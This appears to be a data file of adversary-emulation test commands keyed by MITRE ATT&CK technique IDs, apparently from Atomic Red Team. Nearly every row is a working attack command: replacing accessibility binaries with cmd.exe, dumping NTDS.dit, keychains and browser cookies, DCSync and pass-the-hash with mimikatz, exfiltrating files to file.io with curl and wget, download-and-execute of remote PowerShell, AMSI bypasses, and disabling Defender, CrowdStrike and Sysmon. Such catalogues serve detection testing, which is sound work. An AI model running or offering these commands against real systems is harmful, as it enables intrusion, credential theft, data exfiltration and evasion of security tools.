T1546,Replace Narrator.exe (Narrator binary) with cmd.exe,if not exist c:\windows\system32\narrator_backup.exe (copy c:\windows\system32\narrator.exe c:\windows\system32\narrator_backup.exe) else ( pushd ) takeown /f c:\windows\system32\narrator.exe /a icacls c:\windows\system32\narrator.exe /grant administrators:f /t copy /y c:\windows\system32\cmd.exe c:\windows\system32\narrator.exe
T1546,Replace DisplaySwitch.exe (Display Switcher binary) with cmd.exe,if not exist c:\windows\system32\displayswitch_backup.exe (copy c:\windows\system32\displayswitch.exe c:\windows\system32\displayswitch_backup.exe) else ( pushd ) takeown /f c:\windows\system32\displayswitch.exe /a icacls c:\windows\system32\displayswitch.exe /grant administrators:f /t copy /y c:\windows\system32\cmd.exe c:\windows\system32\displayswitch.exe
T1546,Replace AtBroker.exe (App Switcher binary) with cmd.exe,if not exist c:\windows\system32\atbroker_backup.exe (copy c:\windows\system32\atbroker.exe c:\windows\system32\atbroker_backup.exe) else ( pushd ) takeown /f c:\windows\system32\atbroker.exe /a icacls c:\windows\system32\atbroker.exe /grant administrators:f /t copy /y c:\windows\system32\cmd.exe c:\windows\system32\atbroker.exe
T1622,Detect a Debugger Presence in the Machine,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached"
T1610,Deploy Docker container,docker build -t t1610 $pathtoatomicsfolder/t1610/src/ docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh
T1110,Password Cracking with Hashcat,cd #{hashcat_exe}\.. #{hashcat_exe} -a 0 -m 1000 -r .\rules\incisive-leetspeak.rule #{input_file_sam} #{input_file_passwords}
T1218,Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject,mshta.exe javascript:a=(getobject('script:#{file_url}')).exec();close();
T1218,Mshta executes VBScript to execute malicious command,"mshta vbscript:execute(""createobject(""""wscript.shell"""").run """"powershell -noexit -file pathtoatomicsfolder\t1218.005\src\powershell.ps1"""":close"")"
T1218,Mshta Executes Remote HTML Application (HTA),"$var =invoke-webrequest ""#{hta_url}"" $var.content|out-file ""#{temp_file}"" mshta ""#{temp_file}"" start-sleep -s 15 stop-process -name ""calculator"" -force -erroraction ignore stop-process -name ""calculatorapp"" -force -erroraction ignore"
T1218,Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement,invoke-athhtmlapplication -htafilepath #{hta_file_path} -scriptengine #{script_engine} -aslocaluncpath -simulatelateralmovement -mshtafilepath #{mshta_file_path}
T1218,Invoke HTML Application - Jscript Engine Simulating Double Click,invoke-athhtmlapplication -htafilepath #{hta_file_path} -scriptengine #{script_engine} -simulateuserdoubleclick
T1218,Invoke HTML Application - Direct download from URI,invoke-athhtmlapplication -htauri #{hta_uri} -mshtafilepath #{mshta_file_path}
T1218,Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler,invoke-athhtmlapplication -scriptengine #{script_engine} -inlineprotocolhandler #{protocol_handler} -userundll32 -rundll32filepath #{rundll32_file_path}
T1218,Invoke HTML Application - JScript Engine with Inline Protocol Handler,invoke-athhtmlapplication -scriptengine #{script_engine} -inlineprotocolhandler #{protocol_handler} -mshtafilepath #{mshta_file_path}
T1218,Invoke HTML Application - Simulate Lateral Movement over UNC Path,invoke-athhtmlapplication -templatepe -aslocaluncpath -mshtafilepath #{mshta_file_path}
T1218,Mshta used to Execute PowerShell,"mshta.exe ""about:<hta:application><script language=""vbscript"">close(execute(""createobject(""""wscript.shell"""").run%20""""powershell.exe%20-nop%20-command%20write-host%20#{message};start-sleep%20-seconds%20#{seconds_to_sleep}""""""))</script>'"""
T1542,UEFI Persistence via Wpbbin.exe File Creation,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe"""
T1053,Scheduled Task Startup Script,"schtasks /create /tn ""t1053_005_onlogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" schtasks /create /tn ""t1053_005_onstartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe"""
T1053,Scheduled task Local,schtasks /create /sc once /tn spawn /tr #{task_command} /st #{time}
T1053,Scheduled task Remote,"schtasks /create /s #{target} /ru #{user_name} /rp #{password} /tn ""atomic task"" /tr ""#{task_command}"" /sc daily /st #{time}"
T1053,Powershell Cmdlet Scheduled Task,"$action = new-scheduledtaskaction -execute ""calc.exe"" $trigger = new-scheduledtasktrigger -atlogon $user = new-scheduledtaskprincipal -groupid ""builtin\administrators"" -runlevel highest $set = new-scheduledtasksettingsset $object = new-scheduledtask -action $action -principal $user -trigger $trigger -settings $set register-scheduledtask atomictask -inputobject $object"
T1053,Task Scheduler via VBA,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""pathtoatomicsfolder\t1053.005\src\t1053.005-macrocode.txt"" -officeproduct ""#{ms_product}"" -sub ""scheduler"""
T1053,WMI Invoke-CimMethod Scheduled Task,"$xml = [system.io.file]::readalltext(""#{xml_path}"") invoke-cimmethod -classname ps_scheduledtask -namespace ""root\microsoft\windows\taskscheduler"" -methodname ""registerbyxml"" -arguments @{ force = $true; xml =$xml; }"
T1053,Scheduled Task Executing Base64 Encoded Commands From Registry,"reg add hkcu\software\atomic-t1053.005 /v test /t reg_sz /d cgluzyaxmjcumc4wlje= /f schtasks.exe /create /f /tn ""atomic-t1053.005"" /tr ""cmd /c start /min \""\"" powershell.exe -command iex([system.text.encoding]::ascii.getstring([system.convert]::frombase64string((get-itemproperty -path hkcu:\\software\\atomic-t1053.005).test)))"" /sc daily /st #{time}"
T1053,Import XML Schedule Task with Hidden Attribute,"$xml = [system.io.file]::readalltext(""#{xml_path}"") invoke-cimmethod -classname ps_scheduledtask -namespace ""root\microsoft\windows\taskscheduler"" -methodname ""registerbyxml"" -arguments @{ force = $true; xml =$xml; }"
T1053,PowerShell Modify A Scheduled Task,"$action = new-scheduledtaskaction -execute ""cmd.exe"" $trigger = new-scheduledtasktrigger -atlogon $user = new-scheduledtaskprincipal -groupid ""builtin\administrators"" -runlevel highest $set = new-scheduledtasksettingsset $object = new-scheduledtask -action $action -principal $user -trigger $trigger -settings $set register-scheduledtask atomictaskmodifed -inputobject $object $newaction = new-scheduledtaskaction -execute ""notepad.exe"" set-scheduledtask ""atomictaskmodifed"" -action $newaction"
T1053,"Scheduled Task (""Ghost Task"") via Registry Key Manipulation","""pathtoatomicsfolder\..\externalpayloads\psexec.exe"" \\#{target} -accepteula -s ""cmd.exe"" ""pathtoatomicsfolder\..\externalpayloads\ghosttask.exe"" \\#{target} add #{task_name} ""cmd.exe"" ""/c #{task_command}"" #{user_name} logon"
T1053,Scheduled Task Persistence via CompMgmt.msc,"reg add ""hkey_current_user\software\classes\mscfile\shell\open\command"" /ve /t reg_expand_sz /d ""c:\windows\system32\#{payload}"" /f schtasks /create /tn ""#{task_name}"" /tr ""compmgmt.msc"" /sc onlogon /rl highest /f echo let's open the computer management console now... compmgmt.msc"
T1053,Scheduled Task Persistence via Eventviewer.msc,"reg add ""hkey_current_user\software\classes\mscfile\shell\open\command"" /ve /t reg_expand_sz /d ""c:\windows\system32\#{payload}"" /f schtasks /create /tn ""#{task_name}"" /tr ""eventvwr.msc"" /sc onlogon /rl highest /f echo let's run the schedule task ... schtasks /run /tn ""eventviewerbypass"""
T1003,Create Volume Shadow Copy with vssadmin,vssadmin.exe create shadow /for=#{drive_letter}
T1003,Copy NTDS.dit from Volume Shadow Copy,copy #{vsc_name}\windows\ntds\ntds.dit #{extract_path}\ntds.dit copy #{vsc_name}\windows\system32\config\system #{extract_path}\vsc_system_hive reg save hklm\system #{extract_path}\system_hive
T1003,Dump Active Directory Database with NTDSUtil,"mkdir #{output_folder} ntdsutil ""ac i ntds"" ""ifm"" ""create full #{output_folder}"" q q"
T1003,Create Volume Shadow Copy with WMI,wmic shadowcopy call create volume=#{drive_letter}
T1003,Create Volume Shadow Copy remotely with WMI,"wmic /node:""#{target_host}"" shadowcopy call create volume=#{drive_letter}"
T1003,Create Volume Shadow Copy remotely (WMI) with esentutl,"wmic /node:""#{target_host}"" process call create ""cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}"""
T1003,Create Volume Shadow Copy with Powershell,"(gwmi -list win32_shadowcopy).create('#{drive_letter}','clientaccessible')"
T1003,Create Symlink to Volume Shadow Copy,vssadmin.exe create shadow /for=#{drive_letter} mklink /d #{symlink_path} \\?\globalroot\device\harddiskvolumeshadowcopy1
T1003,Create Volume Shadow Copy with diskshadow,mkdir c:\exfil diskshadow.exe /s #{filename}
T1016,Enumerate Stored Wi-Fi Profiles And Passwords via netsh,netsh wlan show profile * key=clear
T1003,DCSync (Active Directory),"#{mimikatz_path} ""lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}"" ""exit"""
T1003,Run DSInternals Get-ADReplAccount,get-adreplaccount -all -server #{logonserver}
T1091,USB Malware Spread Simulation,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive/t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" }"
T1055,Process Injection via C#,"""#{exe_binary}"""
T1055,EarlyBird APC Queue Injection in Go,"$pathtoatomicsfolder\t1055.004\bin\x64\earlybird.exe -program ""#{spawn_process_path}"" -debug"
T1055,Remote Process Injection with Go using NtQueueApcThreadEx WinAPI,$pathtoatomicsfolder\t1055.004\bin\x64\ntqueueapcthreadex.exe -debug
T1027,Compile After Delivery using csc.exe,"c:\windows\microsoft.net\framework64\v4.0.30319\csc.exe /out:#{output_file} ""#{input_file}"""
T1027,Dynamic C# Compile,"invoke-expression ""#{input_file}"""
T1027,C compile,gcc #{input_file} && ./a.out clang #{input_file} && ./a.out
T1027,CC compile,g++ #{input_file} && ./a.out clang++ #{input_file} && ./a.out
T1027,Go compile,go run #{input_file}
T1546,IFEO Add Debugger,"reg add ""hklm\software\microsoft\windows nt\currentversion\image file execution options\#{target_binary}"" /v debugger /d ""#{payload_binary}"""
T1546,IFEO Global Flags,"reg add ""hklm\software\microsoft\windows nt\currentversion\image file execution options\#{target_binary}"" /v globalflag /t reg_dword /d 512 reg add ""hklm\software\microsoft\windows nt\currentversion\silentprocessexit\#{target_binary}"" /v reportingmode /t reg_dword /d 1 reg add ""hklm\software\microsoft\windows nt\currentversion\silentprocessexit\#{target_binary}"" /v monitorprocess /d ""#{payload_binary}"""
T1546,GlobalFlags in Image File Execution Options,"$name = ""globalflag"" $value = ""512"" $registrypath = ""hklm:\software\microsoft\windows nt\currentversion\image file execution options\#{process}"" new-item -path $registrypath -force new-itemproperty -path $registrypath -name $name -value $value -propertytype dword -force $name = ""reportingmode"" $value = ""1"" $silentprocessexit = ""hklm:\software\microsoft\windows nt\currentversion\silentprocessexit\#{process}"" new-item -path $silentprocessexit -force new-itemproperty -path $silentprocessexit -name $name -value $value -propertytype dword -force $name = ""monitorprocess"" $value = ""#{cmd_to_run}"" new-itemproperty -path $silentprocessexit -name $name -value $value -propertytype string -force start-process whoami.exe"
T1037,Add file to Local Library StartupItems,sudo touch /library/startupitems/evilstartup.plist
T1037,Add launch script to launch daemon,sudo cp #{path_startup_params} /library/startupitems/startupparameters.plist sudo cp #{path_malicious_script} /library/startupitems/atomic.sh sudo cp #{path_malicious_plist} /tmp/t1037_005_daemon.plist sudo /library/startupitems/atomic.sh start
T1037,Add launch script to launch agent,sudo cp #{path_startup_params} /library/startupitems/startupparameters.plist sudo cp #{path_malicious_script} /library/startupitems/atomic.sh sudo cp #{path_malicious_plist} /tmp/t1037_005_agent.plist /library/startupitems/atomic.sh start
T1071,Telnet C2,#{client_path} #{server_ip} --port #{server_port}
T1197,Bitsadmin Download (cmd),bitsadmin.exe /transfer /download /priority foreground #{remote_file} #{local_file}
T1197,Bitsadmin Download (PowerShell),start-bitstransfer -priority foreground -source #{remote_file} -destination #{local_file}
T1197,"Persist, Download, & Execute",bitsadmin.exe /create #{bits_job_name} bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file} bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} null bitsadmin.exe /resume #{bits_job_name} ping -n 5 127.0.0.1 >nul 2>&1 bitsadmin.exe /complete #{bits_job_name}
T1197,Bits download using desktopimgdownldr.exe (cmd),"set ""#{download_path}"" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventname:desktopimgdownldr"
T1555,Keychain Dump,sudo security dump-keychain -d login.keychain
T1555,Export Certificate Item(s),security find-certificate -a -p > #{cert_export}
T1555,Import Certificate Item(s) into Keychain,security import #{cert_export} -k
T1555,Copy Keychain using cat utility,cat ~/library/keychains/login.keychain-db > #{keychain_export}
T1048,Exfiltrate data HTTPS using curl windows,"#{curl_path} -k -f ""file=@#{input_file}"" https://file.io/"
T1048,"Exfiltrate data HTTPS using curl freebsd,linux or macos",curl -f 'file=@#{input_file}' -f 'maxdownloads=1' -f 'autodelete=true' https://file.io/
T1048,Exfiltrate data in a file over HTTPS using wget,"wget --post-file=""#{input_file}"" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after"
T1048,Exfiltrate data as text over HTTPS using wget,"wget --post-data=""msg=atomictestt1048.002"" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after"
T1124,System Time Discovery,net time \\#{computer_name} w32tm /tz
T1124,System Time Discovery - PowerShell,get-date
T1124,System Time Discovery in FreeBSD/macOS,date
T1124,System Time Discovery W32tm as a Delay,w32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2
T1124,System Time with Windows time Command,time
T1124,Discover System Time Zone via Registry,"reg query ""hklm\system\currentcontrolset\control\timezoneinformation"" /v timezonekeyname"
T1547,Authentication Package,"copy-item ""$pathtoatomicsfolder\t1547.002\bin\package.dll"" c:\windows\system32\ reg add ""hkey_local_machine\system\currentcontrolset\control\lsa"" /v ""authentication packages"" /t reg_multi_sz /d ""msv1_0\0package.dll"" /f"
T1134,Injection SID-History with mimikatz,"#{mimikatz_path} ""privilege::debug"" ""sid::patch"" ""sid::add /sid:#{sid_to_inject} /sam:#{sam_account_name}"" ""exit"""
T1570,Exfiltration Over SMB over QUIC (New-SmbMapping),new-smbmapping -remotepath '#{remote_path}' -transporttype quic -skipcertificatecheck copy '#{local_file}' 'z:\'
T1570,Exfiltration Over SMB over QUIC (NET USE),net use * '#{remote_path}' /transport:quic /skipcertcheck copy '#{local_file}' '*:\'
T1550,Mimikatz Pass the Hash,"#{mimikatz_path} ""sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}"""
T1550,crackmapexec Pass the Hash,#{crackmapexec_exe} #{domain} -u #{user_name} -h #{ntlm} -x #{command}
T1550,Invoke-WMIExec Pass the Hash,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/kevin-robertson/invoke-thehash/01ee90f934313acc7d09560902443c18694ed0eb/invoke-wmiexec.ps1' -usebasicparsing);invoke-wmiexec -target #{target} -username #{user_name} -hash #{ntlm} -command #{command}
T1546,Install AppInit Shim,"reg.exe import ""#{registry_file}"""
T1016,System Network Configuration Discovery on Windows,ipconfig /all netsh interface show interface arp -a nbtstat -n net config
T1016,List Windows Firewall Rules,netsh advfirewall firewall show rule name=all
T1016,System Network Configuration Discovery,"if [ ""$(uname)"" = 'freebsd' ]; then cmd=""netstat -sp tcp""; else cmd=""netstat -ant""; fi; if [ -x ""$(command -v arp)"" ]; then arp -a; else echo ""arp is missing from the machine. skipping...""; fi; if [ -x ""$(command -v ifconfig)"" ]; then ifconfig; else echo ""ifconfig is missing from the machine. skipping...""; fi; if [ -x ""$(command -v ip)"" ]; then ip addr; else echo ""ip is missing from the machine. skipping...""; fi; if [ -x ""$(command -v netstat)"" ]; then $cmd | awk '{print $nf}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo ""netstat is missing from the machine. skipping...""; fi;"
T1016,System Network Configuration Discovery (TrickBot Style),ipconfig /all net config workstation net view /all /domain nltest /domain_trusts
T1016,List Open Egress Ports,"$ports = get-content ""#{port_file}"" $file = ""#{output_file}"" $totalopen = 0 $totalports = 0 new-item $file -force foreach ($port in $ports) { $test = new-object system.net.sockets.tcpclient $wait = $test.beginconnect(""allports.exposed"", $port, $null, $null) $wait.asyncwaithandle.waitone(250, $false) | out-null $totalports++ | out-null if ($test.connected) { $result = ""$port open"" write-host -foregroundcolor green $result $result | out-file -encoding ascii -append $file $totalopen++ | out-null } else { $result = ""$port closed"" write-host -foregroundcolor red $result $totalclosed++ | out-null $result | out-file -encoding ascii -append $file } } $results = ""there were a total of $totalopen open ports out of $totalports ports tested."" $results | out-file -encoding ascii -append $file write-host $results"
T1016,Adfind - Enumerate Active Directory Subnet Objects,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" -f (objectcategory=subnet) #{optional_args}"
T1016,Qakbot Recon,"""#{recon_commands}"""
T1016,List macOS Firewall Rules,sudo defaults read /library/preferences/com.apple.alf sudo /usr/libexec/applicationfirewall/socketfilterfw --getglobalstate
T1016,DNS Server Discovery Using nslookup,nslookup -querytype=all -timeout=12 _ldap._tcp.dc._msdcs.%userdnsdomain%
T1546,Add command to .bash_profile,echo '#{command_to_add}' >> ~/.bash_profile
T1546,Add command to .bashrc,echo '#{command_to_add}' >> ~/.bashrc
T1546,Add command to .shrc,echo '#{command_to_add}' >> ~/.shrc
T1546,Append to the system shell profile,echo '#{text_to_append}' >> /etc/profile
T1546,Append commands user shell profile,echo '#{text_to_append}' >> ~/.profile
T1546,System shell profile scripts,echo '#{text_to_append}' >> /etc/profile.d/bash_completion.sh
T1546,Create/Append to .bash_logout,"useradd --create-home --shell /bin/bash art su -l art -c ""echo 'echo \""atomic red team was here... t1546.004\"" >> /home/art/art.txt' >> /home/art/.bash_logout; exit"""
T1613,Docker Container and Resource Discovery,docker build -t t1613 $pathtoatomicsfolder/t1613/src/ docker run --name t1613_container --rm -d -t t1613 docker ps docker stats --no-stream docker inspect $(docker ps -l -q --filter ancestor=t1613)
T1613,Podman Container and Resource Discovery,podman build -t t1613 $pathtoatomicsfolder/t1613/src/ podman run --name t1613_container --rm -d -t t1613 podman ps podman stats --no-stream podman inspect $(podman ps -l -q --filter ancestor=t1613)
T1539,Steal Firefox Cookies (Windows),"stop-process -name ""firefox"" -force -erroraction silentlycontinue $cookiedblocation = get-childitem -path ""$env:appdata\mozilla\firefox\profiles\*\cookies.sqlite"" ""select host, name, value, path, expiry, issecure, ishttponly, samesite from [moz_cookies];"" | cmd /c #{sqlite3_path} ""$cookiedblocation"" | out-file -filepath ""#{output_file}"""
T1539,Steal Chrome Cookies (Windows),"stop-process -name ""chrome"" -force -erroraction silentlycontinue ""select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [cookies];"" | cmd /c #{sqlite3_path} ""#{cookie_db}"" | out-file -filepath ""#{output_file}"""
T1539,Steal Chrome Cookies via Remote Debugging (Mac),"killall 'google chrome' sleep 1 open -a ""/applications/google chrome.app/contents/macos/google chrome"" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/ sleep 1 /tmp/whitechocolatemacademianut/chocolate -d cookies -p 1337"
T1539,Steal Chrome v127+ cookies via Remote Debugging (Windows),"$devtoolsport = 9222 $testurl = ""https://www.google.com"" stop-process -name ""chrome"" -force -erroraction silentlycontinue $chromeprocess = start-process ""chrome.exe"" ""$testurl --remote-debugging-port=$devtoolsport --profile-directory=default"" -passthru start-sleep 10 $jsonresponse = invoke-webrequest ""http://localhost:$devtoolsport/json"" -usebasicparsing $devtoolspages = convertfrom-json $jsonresponse.content $ws_url = $devtoolspages[0].websocketdebuggerurl $ws = new-object system.net.websockets.clientwebsocket $uri = new-object system.uri($ws_url) $ws.connectasync($uri, [system.threading.cancellationtoken]::none).wait() $get_all_cookies_request = '{""id"": 1, ""method"": ""network.getallcookies""}' $buffer = [system.text.encoding]::utf8.getbytes($get_all_cookies_request) $segment = new-object system.arraysegment[byte] -argumentlist $buffer, 0, $buffer.length $ws.sendasync($segment, [system.net.websockets.websocketmessagetype]::text, $true, [system.threading.cancellationtoken]::none).wait() $completemessage = new-object system.text.stringbuilder do { $receivedbuffer = new-object byte[] 2048 $receivedsegment = new-object system.arraysegment[byte] -argumentlist $receivedbuffer, 0, $receivedbuffer.length $result = $ws.receiveasync($receivedsegment, [system.threading.cancellationtoken]::none).result $receivedstring = [system.text.encoding]::utf8.getstring($receivedsegment.array, $receivedsegment.offset, $result.count) $completemessage.append($receivedstring) } while (-not $result.endofmessage) $ws.closeasync([system.net.websockets.websocketclosestatus]::normalclosure, ""closing"", [system.threading.cancellationtoken]::none).wait() try { $response = convertfrom-json $completemessage.tostring() $cookies = $response.result.cookies } catch { write-host ""error parsing json data."" } write-host $cookies stop-process $chromeprocess -force"
T1539,Copy Safari BinaryCookies files using AppleScript,"osascript -e 'tell application ""finder""' -e 'set destinationfolderpath to posix file ""#{destination_path}""' -e 'set safarifolder to ((path to library folder from user domain as text) & ""containers:com.apple.safari:data:library:cookies:"")' -e 'duplicate file ""cookies.binarycookies"" of folder safarifolder to folder destinationfolderpath with replacing' -e 'end tell'"
T1562,Disable syslog,#{flavor_command}
T1562,Disable syslog (freebsd),"service syslogd stop sysrc syslogd_enable=""no"""
T1562,Disable Cb Response,"if [ $(rpm -q --queryformat '%{version}' centos-release) -eq ""6"" ]; then service cbdaemon stop chkconfig off cbdaemon else if [ $(rpm -q --queryformat '%{version}' centos-release) -eq ""7"" ]; systemctl stop cbdaemon systemctl disable cbdaemon fi"
T1562,Disable SELinux,setenforce 0
T1562,Stop Crowdstrike Falcon on Linux,sudo systemctl stop falcon-sensor.service sudo systemctl disable falcon-sensor.service
T1562,Disable Carbon Black Response,sudo launchctl unload /library/launchdaemons/com.carbonblack.daemon.plist sudo launchctl unload /library/launchdaemons/com.carbonblack.defense.daemon.plist
T1562,Disable LittleSnitch,sudo launchctl unload /library/launchdaemons/at.obdev.littlesnitchd.plist
T1562,Disable OpenDNS Umbrella,sudo launchctl unload /library/launchdaemons/com.opendns.osx.roamingclientconfigupdater.plist
T1562,Disable macOS Gatekeeper,sudo spctl --master-disable
T1562,Stop and unload Crowdstrike Falcon on macOS,sudo launchctl unload #{falcond_plist} sudo launchctl unload #{userdaemon_plist}
T1562,Unload Sysmon Filter Driver,fltmc.exe unload #{sysmon_driver}
T1562,Uninstall Sysmon,sysmon -u
T1562,AMSI Bypass - AMSI InitFailed,"[ref].assembly.gettype('system.management.automation.amsiutils').getfield('amsiinitfailed','nonpublic,static').setvalue($null,$true)"
T1562,AMSI Bypass - Remove AMSI Provider Reg Key,"remove-item -path ""hklm:\software\microsoft\amsi\providers\{2781761e-28e0-4109-99fe-b9d127c57afe}"" -recurse"
T1562,Disable Arbitrary Security Windows Service,net.exe stop #{service_name} sc.exe config #{service_name} start= disabled
T1562,Tamper with Windows Defender ATP PowerShell,set-mppreference -disablerealtimemonitoring 1 set-mppreference -disablebehaviormonitoring 1 set-mppreference -disablescriptscanning 1 set-mppreference -disableblockatfirstseen 1
T1562,Tamper with Windows Defender Command Prompt,sc stop windefend sc config windefend start=disabled sc query windefend
T1562,Tamper with Windows Defender Registry,"set-itemproperty ""hklm:\software\policies\microsoft\windows defender"" -name disableantispyware -value 1"
T1562,Disable Microsoft Office Security Features,"new-item -path ""hkcu:\software\microsoft\office\16.0\excel"" new-item -path ""hkcu:\software\microsoft\office\16.0\excel\security"" new-item -path ""hkcu:\software\microsoft\office\16.0\excel\security\protectedview"" new-itemproperty -path ""hkcu:\software\microsoft\office\16.0\excel\security"" -name ""vbawarnings"" -value ""1"" -propertytype ""dword"" new-itemproperty -path ""hkcu:\software\microsoft\office\16.0\excel\security\protectedview"" -name ""disableinternetfilesinpv"" -value ""1"" -propertytype ""dword"" new-itemproperty -path ""hkcu:\software\microsoft\office\16.0\excel\security\protectedview"" -name ""disableunsafelocationsinpv"" -value ""1"" -propertytype ""dword"" new-itemproperty -path ""hkcu:\software\microsoft\office\16.0\excel\security\protectedview"" -name ""disableattachementsinpv"" -value ""1"" -propertytype ""dword"""
T1562,Remove Windows Defender Definition Files,"""c:\program files\windows defender\mpcmdrun.exe"" -removedefinitions -all"
T1562,Stop and Remove Arbitrary Security Windows Service,stop-service -name #{service_name} remove-service -name #{service_name}
T1562,Uninstall Crowdstrike Falcon on Windows,"if (test-path ""#{falcond_path}"") {. ""#{falcond_path}"" /repair /uninstall /quiet } else { get-childitem -path ""c:\programdata\package cache"" -include ""windowssensor.exe"" -recurse | % { $sig=$(get-authenticodesignature -filepath $_.fullname); if ($sig.status -eq ""valid"" -and $sig.signercertificate.dnsnamelist -eq ""crowdstrike, inc."") { . ""$_"" /repair /uninstall /quiet; break;}}}"
T1562,Tamper with Windows Defender Evade Scanning -Folder,"$excludedpath= ""#{excluded_folder}"" add-mppreference -exclusionpath $excludedpath"
T1562,Tamper with Windows Defender Evade Scanning -Extension,"$excludedexts= ""#{excluded_exts}"" add-mppreference -exclusionextension $excludedexts"
T1562,Tamper with Windows Defender Evade Scanning -Process,"$excludedprocess = ""#{excluded_process}"" add-mppreference -exclusionprocess $excludedprocess"
T1562,office-365-Disable-AntiPhishRule,"$secure_pwd = ""#{password}"" | convertto-securestring -asplaintext -force $creds = new-object system.management.automation.pscredential -argumentlist ""#{username}"", $secure_pwd connect-exchangeonline -credential $creds $test = get-antiphishrule disable-antiphishrule -identity $test.name -confirm:$false get-antiphishrule"
T1562,Disable Windows Defender with DISM,dism /online /disable-feature /featurename:windows-defender /remove /norestart /quiet
T1562,Disable Defender Using NirSoft AdvancedRun,"try {cmd /c ""#{advancedrun_location}"" /exefilename ""$env:systemroot\system32\sc.exe"" /windowstate 0 /commandline ""stop windefend"" /startdirectory """" /runas 8 /run} catch{} if(#{delete_defender_folder}){ $commandtorun = rmdir ""$env:programdata\microsoft\windows defender"" -recurse try {cmd /c ""#{advancedrun_location}"" /exefilename ""$env:systemroot\system32\windowspowershell\v1.0\powershell.exe"" /windowstate 0 /commandline ""$commandtorun"" /startdirectory """" /runas 8 /run} catch{} }"
T1562,Kill antimalware protected processes using Backstab,"& ""pathtoatomicsfolder\..\externalpayloads\backstab64.exe"" -k -n #{process_name}"
T1562,WinPwn - Kill the event log services for stealth,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') inv-phantom -consoleoutput -noninteractive
T1562,Tamper with Windows Defender ATP using Aliases - PowerShell,set-mppreference -drtm $true set-mppreference -dbm $true set-mppreference -dscrptsc $true set-mppreference -dbaf $true
T1562,LockBit Black - Disable Privacy Settings Experience Using Registry -cmd,"reg add ""hkcu\software\policies\microsoft\windows\oobe"" /v disableprivacyexperience /t reg_dword /d 1 /f"
T1562,LockBit Black - Use Registry Editor to turn on automatic logon -cmd,"reg add ""hklm\software\policies\microsoft\windows nt\currentversion\winlogon"" /v autoadminlogon /t reg_dword /d 1 /f reg add ""hklm\software\policies\microsoft\windows nt\currentversion\winlogon"" /v defaultusername /t reg_sz /d administrator /f reg add ""hklm\software\policies\microsoft\windows nt\currentversion\winlogon"" /v defaultdomainname /t reg_sz /d contoso.com /f reg add ""hklm\software\policies\microsoft\windows nt\currentversion\winlogon"" /v defaultpassword /t reg_sz /d password1 /f"
T1562,LockBit Black - Disable Privacy Settings Experience Using Registry -Powershell,"new-itemproperty ""hkcu:\software\policies\microsoft\windows\oobe"" -name disableprivacyexperience -propertytype dword -value 1 -force"
T1562,Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell,"new-itemproperty ""hklm:\software\policies\microsoft\windows nt\currentversion\winlogon"" -name autoadminlogon -propertytype dword -value 1 -force new-itemproperty ""hklm:\software\policies\microsoft\windows nt\currentversion\winlogon"" -name defaultusername -value administrator -force new-itemproperty ""hklm:\software\policies\microsoft\windows nt\currentversion\winlogon"" -name defaultdomainname -value contoso.com -force new-itemproperty ""hklm:\software\policies\microsoft\windows nt\currentversion\winlogon"" -name defaultpassword -value password1 -force"
T1562,Disable Windows Defender with PwSh Disable-WindowsOptionalFeature,"disable-windowsoptionalfeature -online -featurename ""windows-defender-gui"" -norestart -erroraction ignore disable-windowsoptionalfeature -online -featurename ""windows-defender-features"" -norestart -erroraction ignore disable-windowsoptionalfeature -online -featurename ""windows-defender"" -norestart -erroraction ignore disable-windowsoptionalfeature -online -featurename ""windows-defender-applicationguard"" -norestart -erroraction ignore"
T1562,WMIC Tamper with Windows Defender Evade Scanning Folder,"wmic.exe /namespace:\\root\microsoft\windows\defender class msft_mppreference call add exclusionpath=\""atomicredteam\"""
T1562,Delete Windows Defender Scheduled Tasks,"if exist ""%temp%\windows_defender_scheduled_scan.xml"" ( schtasks /delete /tn ""\microsoft\windows\windows defender\windows defender scheduled scan"" /f ) if exist ""%temp%\windows_defender_cleanup.xml"" ( schtasks /delete /tn ""\microsoft\windows\windows defender\windows defender cleanup"" /f ) if exist ""%temp%\windows_defender_verification.xml"" ( schtasks /delete /tn ""\microsoft\windows\windows defender\windows defender verification"" /f ) if exist ""%temp%\windows_defender_cache_maintenance.xml"" ( schtasks /delete /tn ""\microsoft\windows\windows defender\windows defender cache maintenance"" /f )"
T1562,Clear History,history -c
T1562,Suspend History,set +o history
T1562,Reboot Linux Host via Kernel System Request,echo 1> /proc/sys/kernel/sysrq echo b> /proc/sysrq-trigger
